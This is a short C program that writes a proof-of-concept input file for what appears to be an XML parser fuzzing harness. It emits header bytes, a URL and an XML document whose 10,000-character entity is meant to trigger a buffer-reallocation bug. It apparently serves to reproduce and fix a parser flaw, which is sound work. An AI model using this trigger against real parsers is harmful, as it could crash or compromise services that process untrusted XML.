#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write options (4 bytes, big-endian, value 0) */
    putc(0, f); putc(0, f); putc(0, f); putc(0, f);
    /* Write maxAlloc (4 bytes, big-endian, value 0) */
    putc(0, f); putc(0, f); putc(0, f); putc(0, f);

    /* Write URL "test.xml" in fuzz string format (backslash doubled, terminated by 0x5C 0x0A) */
    fwrite("test.xml", 1, 8, f);
    putc('\\', f); putc('\n', f);

    /* Write XML payload in fuzz string format */
    fprintf(f, "<?xml version=\"1.0\"?>\n");
    fprintf(f, "<!DOCTYPE foo [\n");
    fprintf(f, "<!ENTITY x \"");
    /* Long entity value to trigger buffer reallocation */
    for (int i = 0; i < 10000; i++) {
        putc('A', f);
    }
    fprintf(f, "\">\n");
    fprintf(f, "]>\n");
    fprintf(f, "<root>&x;</root>\n");

    /* Terminate fuzz string with backslash-newline */
    putc('\\', f); putc('\n', f);

    fclose(f);
    return 0;
}